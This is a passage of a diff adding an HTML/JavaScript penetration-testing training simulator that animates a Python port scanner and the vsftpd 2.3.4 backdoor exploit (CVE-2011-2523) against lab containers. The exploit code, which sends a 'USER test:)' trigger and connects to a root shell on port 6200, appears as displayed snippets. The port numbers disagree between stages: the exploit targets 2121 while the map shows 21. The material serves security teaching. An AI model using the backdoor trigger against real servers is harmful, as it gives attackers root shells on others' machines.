@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Penetration Testing Simulator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@400;600;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0b1120; /* Darker slate */
+            color: #e2e8f0;
+            overflow: hidden; 
+        }
+
+        .font-mono {
+            font-family: 'Fira Code', monospace;
+        }
+
+        /* UI Enhancements */
+        .glass-panel {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(148, 163, 184, 0.1);
+        }
+
+        .cyber-border {
+            box-shadow: 0 0 0 1px rgba(59, 130, 246, 0.5);
+        }
+
+        /* Code Highlighting */
+        .code-line {
+            padding: 2px 8px;
+            border-radius: 4px;
+            transition: all 0.2s;
+            opacity: 0.7;
+        }
+        .code-active {
+            background-color: rgba(34, 197, 94, 0.2);
+            border-left: 3px solid #22c55e;
+            opacity: 1;
+            font-weight: 600;
+        }
+        .keyword { color: #c678dd; }
+        .func { color: #61afef; }
+        .string { color: #98c379; }
+        .comment { color: #5c6370; font-style: italic; }
+
+        /* Network Map Animations */
+        .packet {
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            z-index: 50;
+            box-shadow: 0 0 12px currentColor;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+            font-weight: bold;
+            color: black;
+        }
+
+        .animate-travel {
+            animation: travel-path 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        /* Simplified path logic using CSS variables set by JS */
+        @keyframes travel-path {
+            0% { 
+                transform: translate(0, 0) scale(0.5); 
+                opacity: 0; 
+            }
+            10% {
+                opacity: 1;
+                transform: translate(0, 0) scale(1);
+            }
+            90% {
+                opacity: 1;
+                transform: translate(var(--tx), var(--ty)) scale(1);
+            }
+            100% { 
+                transform: translate(var(--tx), var(--ty)) scale(0.5); 
+                opacity: 0; 
+            }
+        }
+
+        /* Terminal CRT Effect */
+        .terminal-container {
+            background-color: #0c0c0c;
+            position: relative;
+            overflow: hidden;
+        }
+        .scanline {
+            width: 100%;
+            height: 100px;
+            z-index: 10;
+            background: linear-gradient(0deg, rgba(0,0,0,0) 0%, rgba(34, 197, 94, 0.04) 50%, rgba(0,0,0,0) 100%);
+            opacity: 0.1;
+            position: absolute;
+            bottom: 100%;
+            animation: scanline 10s linear infinite;
+            pointer-events: none;
+        }
+        @keyframes scanline {
+            0% { bottom: 100%; }
+            100% { bottom: -100px; }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+
+        .typing-cursor::after {
+            content: '▋';
+            animation: blink 1s step-start infinite;
+            color: #22c55e;
+            margin-left: 2px;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Glossary Tooltips */
+        .term-hover {
+            border-bottom: 1px dashed #64748b;
+            cursor: help;
+        }
+        .term-hover:hover {
+            color: #60a5fa;
+            border-bottom-color: #60a5fa;
+        }
+    </style>
+</head>
+<body class="h-screen flex flex-col selection:bg-blue-500 selection:text-white">
+
+    <!-- Header -->
+    <header class="bg-slate-900 border-b border-slate-800 p-4 flex justify-between items-center shrink-0 shadow-lg z-20">
+        <div class="flex items-center gap-4">
+            <div class="bg-blue-600/20 p-2 rounded-lg border border-blue-500/30">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.384-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" />
+                </svg>
+            </div>
+            <div>
+                <h1 class="font-bold text-xl text-white tracking-tight">PenTest<span class="text-blue-500">Sim</span> <span class="text-slate-500 font-normal text-sm ml-2">v2.0.1</span></h1>
+                <p class="text-xs text-slate-400">Environment: Docker Subnet 172.20.0.0/24 • Python 3.9</p>
+            </div>
+        </div>
+        
+        <!-- Mode Switcher -->
+        <div class="flex bg-slate-950 rounded-lg p-1 border border-slate-800">
+            <button onclick="setMode('scanner')" id="btn-scanner" class="flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                Stage 2: Port Scanner
+            </button>
+            <button onclick="setMode('exploit')" id="btn-exploit" class="flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all text-slate-400 hover:text-white">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.2-2.858.59-4.18M5.55 17.55l8.932-8.931"></path></svg>
+                Stage 5: vsftpd Exploit
+            </button>
+        </div>
+    </header>
+
+    <div class="flex flex-1 overflow-hidden">
+        
+        <!-- Left Panel: Educational Context & Code -->
+        <aside class="w-[450px] bg-slate-900 border-r border-slate-800 flex flex-col z-10 shadow-xl">
+            <!-- Context Header -->
+            <div class="p-6 border-b border-slate-800 bg-slate-900/50">
+                <div class="flex items-center justify-between mb-2">
+                    <h2 id="ctx-title" class="text-lg font-bold text-white">Network Scanning</h2>
+                    <span id="ctx-badge" class="px-2 py-0.5 rounded text-[10px] font-bold bg-blue-900 text-blue-300 uppercase">Reconnaissance</span>
+                </div>
+                <p id="ctx-desc" class="text-sm text-slate-400 leading-relaxed">
+                    We will write a Python script to discover active services. This corresponds to <span class="text-blue-400 font-mono">S13_Part04_Script_Simple_Scanner.py</span>.
+                </p>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="flex-1 flex flex-col bg-[#0d1117] overflow-hidden">
+                <div class="flex items-center justify-between px-4 py-2 bg-[#161b22] border-b border-slate-800">
+                    <span id="code-filename" class="text-xs font-mono text-slate-400">S13_Part04_Script_Simple_Scanner.py</span>
+                    <div class="flex gap-1.5">
+                        <div class="w-2.5 h-2.5 rounded-full bg-red-500/50"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-yellow-500/50"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-green-500/50"></div>
+                    </div>
+                </div>
+                <div id="code-content" class="flex-1 p-4 font-mono text-xs overflow-y-auto leading-6">
+                    <!-- Code injected via JS -->
+                </div>
+            </div>
+
+            <!-- Glossary / Info -->
+            <div class="h-1/4 border-t border-slate-800 bg-slate-900 p-4 overflow-y-auto">
+                <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Technical Concepts</h3>
+                <div id="glossary-area" class="space-y-3 text-xs text-slate-400">
+                    <!-- Dynamic glossary items -->
+                </div>
+            </div>
+        </aside>
+
+        <!-- Center: Visual Network Map -->
+        <main class="flex-1 relative bg-[#0f172a] overflow-hidden flex flex-col">
+            <!-- Status Bar Overlay -->
+            <div class="absolute top-4 left-1/2 -translate-x-1/2 z-40">
+                <div id="action-status" class="glass-panel px-6 py-2 rounded-full text-sm font-mono text-blue-300 border border-blue-500/20 shadow-[0_0_20px_rgba(59,130,246,0.1)] hidden">
+                    Waiting for input...
+                </div>
+            </div>
+
+            <!-- Legend -->
+            <div class="absolute top-4 right-4 z-40 glass-panel p-3 rounded-lg border border-slate-700">
+                <h4 class="text-[10px] font-bold text-slate-500 uppercase mb-2">Packet Legend</h4>
+                <div class="space-y-1.5 text-[10px] font-mono text-slate-300">
+                    <div class="flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-yellow-400 shadow-[0_0_5px_#facc15]"></div> SYN (Connect)</div>
+                    <div class="flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-blue-400 shadow-[0_0_5px_#60a5fa]"></div> ACK (Acknowledge)</div>
+                    <div class="flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_5px_#ef4444]"></div> RST (Reset/Close)</div>
+                    <div class="flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-purple-500 shadow-[0_0_5px_#a855f7]"></div> PAYLOAD (Data)</div>
+                </div>
+            </div>
+
+            <!-- Visualization Area -->
+            <div class="flex-1 relative flex items-center justify-center">
+                <!-- Grid -->
+                <div class="absolute inset-0 opacity-20" 
+                     style="background-image: radial-gradient(#64748b 1px, transparent 1px); background-size: 30px 30px;">
+                </div>
+
+                <!-- SVG Layer for Cables -->
+                <svg id="network-svg" class="absolute inset-0 w-full h-full pointer-events-none"></svg>
+
+                <!-- Network Container -->
+                <div class="relative w-full max-w-6xl h-[500px] flex items-center justify-between px-16">
+                    
+                    <!-- Attacker (Left) -->
+                    <div id="node-kali" class="relative group">
+                        <div class="w-24 h-24 bg-slate-800 rounded-xl border-2 border-red-500/50 flex flex-col items-center justify-center shadow-[0_0_30px_rgba(239,68,68,0.1)] z-10 relative group-hover:scale-105 transition-transform">
+                            <svg class="w-10 h-10 text-red-500 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                            <span class="font-bold text-white text-xs">Kali Linux</span>
+                            <span class="font-mono text-[10px] text-slate-400">172.20.0.1</span>
+                        </div>
+                        <!-- Tooltip -->
+                        <div class="absolute -top-12 left-1/2 -translate-x-1/2 bg-black px-2 py-1 rounded border border-slate-700 text-[10px] whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none">
+                            Attacker Machine (Host)
+                        </div>
+                    </div>
+
+                    <!-- Target Subnet (Right) -->
+                    <div class="flex flex-col gap-8">
+                        <!-- Node 1: DVWA -->
+                        <div id="node-dvwa" class="relative group flex items-center gap-4">
+                            <div class="text-right opacity-0 group-hover:opacity-100 transition-opacity -translate-x-2 group-hover:translate-x-0 duration-300">
+                                <div class="text-[10px] font-bold text-slate-300">HTTP Service</div>
+                                <div class="text-[9px] font-mono text-slate-500">Apache/2.4.52</div>
+                            </div>
+                            <div class="node-box w-64 bg-slate-800/80 rounded-lg border border-slate-600 p-3 flex items-center justify-between shadow-lg relative backdrop-blur-sm">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded bg-blue-900/30 flex items-center justify-center text-blue-400">
+                                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg>
+                                    </div>
+                                    <div>
+                                        <div class="font-bold text-sm text-slate-200">DVWA</div>
+                                        <div class="font-mono text-[10px] text-slate-500">172.20.0.10</div>
+                                    </div>
+                                </div>
+                                <div class="flex flex-col items-end gap-1">
+                                    <div class="port-badge flex items-center gap-1.5 bg-slate-950 px-2 py-1 rounded border border-slate-700" data-port="80">
+                                        <div class="w-1.5 h-1.5 rounded-full bg-slate-600 status-dot"></div>
+                                        <span class="font-mono text-[10px] text-slate-400">80/tcp</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Node 2: WebGoat -->
+                        <div id="node-webgoat" class="relative group flex items-center gap-4">
+                            <div class="text-right opacity-0 group-hover:opacity-100 transition-opacity -translate-x-2 group-hover:translate-x-0 duration-300">
+                                <div class="text-[10px] font-bold text-slate-300">Java Web App</div>
+                                <div class="text-[9px] font-mono text-slate-500">Tomcat/9.0</div>
+                            </div>
+                            <div class="node-box w-64 bg-slate-800/80 rounded-lg border border-slate-600 p-3 flex items-center justify-between shadow-lg relative backdrop-blur-sm">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded bg-orange-900/30 flex items-center justify-center text-orange-400">
+                                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
+                                    </div>
+                                    <div>
+                                        <div class="font-bold text-sm text-slate-200">WebGoat</div>
+                                        <div class="font-mono text-[10px] text-slate-500">172.20.0.11</div>
+                                    </div>
+                                </div>
+                                <div class="flex flex-col items-end gap-1">
+                                    <div class="port-badge flex items-center gap-1.5 bg-slate-950 px-2 py-1 rounded border border-slate-700" data-port="8080">
+                                        <div class="w-1.5 h-1.5 rounded-full bg-slate-600 status-dot"></div>
+                                        <span class="font-mono text-[10px] text-slate-400">8080/tcp</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Node 3: vsftpd (VULNERABLE) -->
+                        <div id="node-vsftpd" class="relative group flex items-center gap-4">
+                            <div class="text-right opacity-0 group-hover:opacity-100 transition-opacity -translate-x-2 group-hover:translate-x-0 duration-300">
+                                <div class="text-[10px] font-bold text-red-300">Vulnerable FTP</div>
+                                <div class="text-[9px] font-mono text-slate-500">vsftpd 2.3.4</div>
+                            </div>
+                            <div class="node-box w-64 bg-slate-800/80 rounded-lg border border-slate-600 p-3 flex items-center justify-between shadow-lg relative backdrop-blur-sm transition-colors duration-500" id="vsftpd-box">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded bg-purple-900/30 flex items-center justify-center text-purple-400">
+                                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
+                                    </div>
+                                    <div>
+                                        <div class="font-bold text-sm text-slate-200">vsftpd_vuln</div>
+                                        <div class="font-mono text-[10px] text-slate-500">172.20.0.12</div>
+                                    </div>
+                                </div>
+                                <div class="flex flex-col items-end gap-1">
+                                    <div class="port-badge flex items-center gap-1.5 bg-slate-950 px-2 py-1 rounded border border-slate-700" data-port="21">
+                                        <div class="w-1.5 h-1.5 rounded-full bg-slate-600 status-dot"></div>
+                                        <span class="font-mono text-[10px] text-slate-400">21/tcp</span>
+                                    </div>
+                                    <div id="backdoor-port" class="hidden flex items-center gap-1.5 bg-red-950/50 px-2 py-1 rounded border border-red-900/50 animate-pulse">
+                                        <div class="w-1.5 h-1.5 rounded-full bg-red-500 status-dot"></div>
+                                        <span class="font-mono text-[10px] text-red-400">6200/tcp</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Shell Indicator -->
+                            <div id="shell-window" class="absolute -right-36 top-0 w-32 bg-black border border-green-500 rounded p-2 hidden shadow-lg shadow-green-500/20">
+                                <div class="text-[8px] font-mono text-green-500">
+                                    root@vsftpd:~# <br>
+                                    <span class="typing-cursor"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom: Terminal -->
+            <div class="h-48 bg-[#0c0c0c] border-t border-slate-800 flex flex-col relative z-20 shadow-[0_-10px_40px_rgba(0,0,0,0.5)]">
+                <div class="scanline"></div>
+                <div class="flex items-center justify-between px-4 py-1 bg-[#1a1a1a] border-b border-[#333]">
+                    <span class="text-[10px] font-mono text-slate-400 flex items-center gap-2">
+                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                        root@kali:~/lab_scripts
+                    </span>
+                    <span id="term-status" class="text-[10px] font-mono text-green-500">IDLE</span>
+                </div>
+                <div id="terminal-body" class="flex-1 p-3 font-mono text-xs text-slate-300 overflow-y-auto whitespace-pre font-light"></div>
+                
+                <!-- Controls Floating in Terminal -->
+                <div class="absolute bottom-4 right-4 flex gap-2">
+                    <button id="run-btn" onclick="runScenario()" class="bg-green-600 hover:bg-green-500 text-white text-xs font-bold py-2 px-6 rounded shadow-lg shadow-green-900/20 transition-all active:scale-95 flex items-center gap-2">
+                        <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"></path></svg>
+                        EXECUTE
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Logic -->
+    <script>
+        // --- DATA & CONFIG ---
+        const glossary = {
+            scanner: [
+                { term: "Socket", desc: "Software endpoint for sending/receiving data across a network." },
+                { term: "TCP Handshake", desc: "SYN (Hello) -> SYN-ACK (Hello Back) -> ACK (Connected)." },
+                { term: "connect_ex()", desc: "Python function. Returns 0 if success (Port Open), error code if failed." },
+                { term: "Port", desc: "Logical address for a specific service (e.g., 80 for Web)." }
+            ],
+            exploit: [
+                { term: "Backdoor", desc: "Hidden method for bypassing authentication." },
+                { term: "CVE-2011-2523", desc: "Vulnerability in vsftpd 2.3.4 triggered by sending 'smile' char :)" },
+                { term: "Banner Grabbing", desc: "Reading the welcome message from a server to identify its version." },
+                { term: "Shell", desc: "Command-line interface access to the OS." }
+            ]
+        };
+
+        const codeSnippets = {
+            scanner: [
+                { id: 1, text: "import socket", type: "import" },
+                { id: 2, text: "target = '172.20.0.10'", type: "var" },
+                { id: 3, text: "def scan_port(ip, port):", type: "def" },
+                { id: 4, text: "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", type: "code", comment: "# Create TCP socket" },
+                { id: 5, text: "    s.settimeout(0.2)", type: "code" },
+                { id: 6, text: "    result = s.connect_ex((ip, port))", type: "code", comment: "# 0 = Success" },
+                { id: 7, text: "    s.close()", type: "code" },
+                { id: 8, text: "    return result == 0", type: "return" }
+            ],
+            exploit: [
+                { id: 1, text: "# CVE-2011-2523 Exploit", type: "comment" },
+                { id: 2, text: "s = socket.socket()", type: "code" },
+                { id: 3, text: "s.connect(('172.20.0.12', 2121))", type: "code", comment: "# Connect to FTP" },
+                { id: 4, text: "banner = s.recv(1024)", type: "code" },
+                { id: 5, text: "s.sendall(b'USER test:)\\r\\n')", type: "code", comment: "# Trigger Backdoor" },
+                { id: 6, text: "s.sendall(b'PASS random\\r\\n')", type: "code" },
+                { id: 7, text: "time.sleep(1)", type: "code" },
+                { id: 8, text: "bd = socket.socket()", type: "code" },
+                { id: 9, text: "bd.connect(('172.20.0.12', 6200))", type: "code", comment: "# Connect Shell" },
+                { id: 10, text: "bd.sendall(b'id\\n')", type: "code" }
+            ]
+        };
+
+        let currentMode = 'scanner';
+        let isRunning = false;
+        let termLines = [];
+        
+        // --- INIT ---
+        window.onload = () => {
+            setMode('scanner');
+            drawCables();
+            typeWriter("Terminal ready. Select a stage to begin...", "text-slate-500");
+        };
+
+        window.onresize = drawCables;
+
+        // --- CORE FUNCTIONS ---
+
+        function setMode(mode) {
+            if(isRunning) return;
+            currentMode = mode;
+            
+            // Buttons UI
+            document.getElementById('btn-scanner').className = mode === 'scanner' 
+                ? "flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all bg-blue-600 text-white shadow-lg shadow-blue-900/20"
+                : "flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all text-slate-400 hover:text-white hover:bg-slate-800";
+            
+            document.getElementById('btn-exploit').className = mode === 'exploit'
+                ? "flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all bg-blue-600 text-white shadow-lg shadow-blue-900/20"
+                : "flex items-center gap-2 px-4 py-2 rounded-md text-sm font-semibold transition-all text-slate-400 hover:text-white hover:bg-slate-800";
+
+            // Context Panel
+            if(mode === 'scanner') {
+                document.getElementById('ctx-title').innerText = "Network Scanning";
+                document.getElementById('ctx-badge').innerText = "RECONNAISSANCE";
+                document.getElementById('ctx-badge').className = "px-2 py-0.5 rounded text-[10px] font-bold bg-blue-900 text-blue-300 uppercase";
+                document.getElementById('ctx-desc').innerHTML = "We iterate through IPs and ports, attempting a <span class='text-blue-300'>TCP 3-Way Handshake</span>. If we receive a SYN-ACK, the port is OPEN.";
+                document.getElementById('code-filename').innerText = "S13_Part04_Script_Simple_Scanner.py";
+            } else {
+                document.getElementById('ctx-title').innerText = "vsftpd 2.3.4 Exploit";
+                document.getElementById('ctx-badge').innerText = "EXPLOITATION";
+                document.getElementById('ctx-badge').className = "px-2 py-0.5 rounded text-[10px] font-bold bg-red-900 text-red-300 uppercase";
+                document.getElementById('ctx-desc').innerHTML = "We exploit a logic flaw in vsftpd 2.3.4. Sending a username with <code>:)</code> triggers the server to open a root shell on port 6200.";
+                document.getElementById('code-filename').innerText = "ftp_backdoor.py";
+            }
+
+            // Render Code
+            renderCode(codeSnippets[mode]);
+            renderGlossary(glossary[mode]);
+            
+            // Reset Visuals
+            resetVisuals();
+        }
+
+        function renderCode(lines) {
+            const container = document.getElementById('code-content');
+            container.innerHTML = '';
+            lines.forEach(line => {
+                const div = document.createElement('div');
+                div.className = `code-line mb-1`;
+                div.id = `line-${line.id}`;
+                
+                // Simple Syntax Highlighting
+                let html = line.text
+                    .replace(/def|import|return/g, '<span class="keyword">$&</span>')
+                    .replace(/socket|print/g, '<span class="func">$&</span>')
+                    .replace(/'[^']*'/g, '<span class="string">$&</span>')
+                    .replace(/\d+/g, '<span class="text-orange-300">$&</span>');
+                
+                if(line.comment) {
+                    html += ` <span class="comment ml-2">${line.comment}</span>`;
+                }
+
+                if(line.type === 'comment') {
+                    div.innerHTML = `<span class="comment">${line.text}</span>`;
+                } else {
+                    div.innerHTML = `<span class="text-slate-600 mr-3 select-none">${line.id}</span>` + html;
+                }
+                
+                container.appendChild(div);
+            });
+        }
+
+        function renderGlossary(items) {
+            const container = document.getElementById('glossary-area');
+            container.innerHTML = '';
+            items.forEach(item => {
+                const div = document.createElement('div');
+                div.innerHTML = `<span class="term-hover font-bold text-slate-300" title="${item.desc}">${item.term}</span>: ${item.desc}`;
+                container.appendChild(div);
+            });
+        }
+
+        // --- SIMULATION RUNNER ---
+
+        async function runScenario() {
+            if(isRunning) return;
+            isRunning = true;
+            document.getElementById('run-btn').classList.add('opacity-50', 'cursor-not-allowed');
+            document.getElementById('term-status').innerText = "RUNNING";
+            
+            resetVisuals();
+            clearTerminal();
+
+            if(currentMode === 'scanner') {
+                await runScannerScenario();
+            } else {
+                await runExploitScenario();
+            }
+
+            isRunning = false;
+            document.getElementById('run-btn').classList.remove('opacity-50', 'cursor-not-allowed');
+            document.getElementById('term-status').innerText = "IDLE";
+            hideStatus();
+        }
+
+        // --- SCANNER LOGIC ---
+        async function runScannerScenario() {
+            typeWriter("root@kali:~# python3 S13_Part04_Script_Simple_Scanner.py", "text-white font-bold");
+            await wait(800);
+            typeWriter("[*] Starting TCP connect scan on subnet 172.20.0.0/24...", "text-blue-400");
+            
+            const targets = [
+                { id: 'node-dvwa', ip: '172.20.0.10', port: 80, open: true },
+                { id: 'node-webgoat', ip: '172.20.0.11', port: 8080, open: true },
+                { id: 'node-vsftpd', ip: '172.20.0.12', port: 21, open: true }
+            ];
+
+            for(let t of targets) {
+                // Highlight Setup
+                highlightLine(4); 
+                setStatus(`Scanning ${t.ip}...`);
+                await wait(500);
+
+                // Send SYN
+                highlightLine(6);
+                typeWriter(`> Scanning ${t.ip}:${t.port}...`, "text-slate-500");
+                await animatePacket('node-kali', t.id, 'SYN', 'bg-yellow-400');
+                
+                if(t.open) {
+                    // Receive SYN-ACK
+                    await animatePacket(t.id, 'node-kali', 'SYN-ACK', 'bg-blue-400');
+                    
+                    // Send ACK/RST (Close)
+                    highlightLine(7);
+                    await animatePacket('node-kali', t.id, 'RST', 'bg-red-500');
+                    
+                    // Success Logic
+                    highlightLine(8);
+                    typeWriter(`[+] Port ${t.port} OPEN on ${t.ip}`, "text-green-400 font-bold");
+                    markPortOpen(t.id, t.port);
+                }
+                await wait(600);
+            }
+            typeWriter("[*] Scan complete.", "text-blue-400");
+            highlightLine(null);
+        }
+
+        // --- EXPLOIT LOGIC ---
+        async function runExploitScenario() {
+            typeWriter("root@kali:~# python3 S13_Part09_Script_FTP_Backdoor_Exploit.py", "text-white font-bold");
+            await wait(1000);
+
+            // 1. Connect
+            setStatus("Initializing socket connection to Target...");
+            highlightLine(2); highlightLine(3);
+            typeWriter("[*] Connecting to 172.20.0.12:2121...", "text-slate-300");
+            
+            await animatePacket('node-kali', 'node-vsftpd', 'SYN', 'bg-yellow-400');
+            await animatePacket('node-vsftpd', 'node-kali', 'ACK', 'bg-blue-400');
+            
+            highlightLine(4);
+            typeWriter("[+] Banner Received: 220 (vsFTPd 2.3.4)", "text-green-400");
+            
+            // 2. Trigger
+            setStatus("Injecting Backdoor Payload 'USER test:)'...");
+            highlightLine(5);
+            typeWriter("> Sending malicious payload...", "text-yellow-400");
+            await animatePacket('node-kali', 'node-vsftpd', 'PAYLOAD', 'bg-purple-500'); // Payload
+            
+            // 3. Wait
+            setStatus("Waiting for server to spawn shell...");
+            highlightLine(7);
+            await wait(1500);
+            
+            // Visual Effect for Port Opening
+            const vsBox = document.getElementById('vsftpd-box');
+            vsBox.classList.add('border-red-500', 'bg-red-900/20');
+            document.getElementById('backdoor-port').classList.remove('hidden');
+            document.getElementById('backdoor-port').classList.add('flex');
+            typeWriter("[!] Backdoor triggered! Port 6200 is now OPEN.", "text-red-400 font-bold");
+            
+            // 4. Connect to Backdoor
+            setStatus("Connecting to Backdoor Shell...");
+            highlightLine(9);
+            typeWriter("[*] Attempting connection to 172.20.0.12:6200...", "text-slate-300");
+            await animatePacket('node-kali', 'node-vsftpd', 'SYN', 'bg-red-500');
+            
+            // Show Shell
+            document.getElementById('shell-window').classList.remove('hidden');
+            
+            // 5. Execute Command
+            highlightLine(10);
+            setStatus("Executing 'id' command...");
+            typeWriter("> Sending command: id", "text-slate-400");
+            await animatePacket('node-kali', 'node-vsftpd', 'CMD', 'bg-white');
+            
+            await wait(500);
+            typeWriter("[+] Response: uid=0(root) gid=0(root)", "text-green-400 bg-green-900/20 p-1");
+            
+            highlightLine(null);
+        }
+
+        // --- ANIMATION UTILS ---
+
+        function drawCables() {
+            const svg = document.getElementById('network-svg');
+            svg.innerHTML = '';
+            
+            const kali = document.getElementById('node-kali').getBoundingClientRect();
+            const container = document.querySelector('main').getBoundingClientRect();
+            
+            const kx = (kali.left + kali.width/2) - container.left;
+            const ky = (kali.top + kali.height/2) - container.top;
+
+            ['node-dvwa', 'node-webgoat', 'node-vsftpd'].forEach(id => {
+                const node = document.getElementById(id).getBoundingClientRect();
+                const nx = (node.left) - container.left;
+                const ny = (node.top + node.height/2) - container.top;
+
+                // Bezier Curve
+                const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
+                const cp1x = kx + (nx - kx) / 2;
+                const d = `M ${kx} ${ky} C ${cp1x} ${ky}, ${cp1x} ${ny}, ${nx} ${ny}`;
+                
+                path.setAttribute("d", d);
+                path.setAttribute("fill", "none");
+                path.setAttribute("stroke", "#334155");
+                path.setAttribute("stroke-width", "2");
+                path.setAttribute("stroke-dasharray", "5,5");
+                path.id = `path-to-${id}`;
+                svg.appendChild(path);
+            });
+        }
+
+        async function animatePacket(fromId, toId, label, colorClass) {
+            const main = document.querySelector('main');
+            const container = main.getBoundingClientRect();
+            
+            const fromEl = document.getElementById(fromId).getBoundingClientRect();
+            const toEl = document.getElementById(toId).getBoundingClientRect();
+            
+            // Calculate Start Centers
+            const startX = (fromId === 'node-kali') ? (fromEl.right - container.left) : (fromEl.left - container.left);
+            const startY = (fromEl.top + fromEl.height/2) - container.top;
+            
+            // Calculate End Centers
+            const endX = (toId === 'node-kali') ? (toEl.right - container.left) : (toEl.left - container.left);
+            const endY = (toEl.top + toEl.height/2) - container.top;
+
+            // Delta
+            const tx = endX - startX;
+            const ty = endY - startY;
+
+            // Create Packet
+            const pkt = document.createElement('div');
+            pkt.className = `packet ${colorClass} animate-travel`;
+            pkt.innerText = label || '';
+            pkt.style.left = startX + 'px';
+            pkt.style.top = startY + 'px';
+            pkt.style.setProperty('--tx', `${tx}px`);
+            pkt.style.setProperty('--ty', `${ty}px`);
+            
+            main.appendChild(pkt);
+            
+            // Wait for animation
+            await wait(1000);
+            pkt.remove();
+        }
+
+        // --- UI HELPERS ---
+
+        function typeWriter(text, classes = "") {
+            const term = document.getElementById('terminal-body');
+            const line = document.createElement('div');
+            line.className = classes + " mb-1";
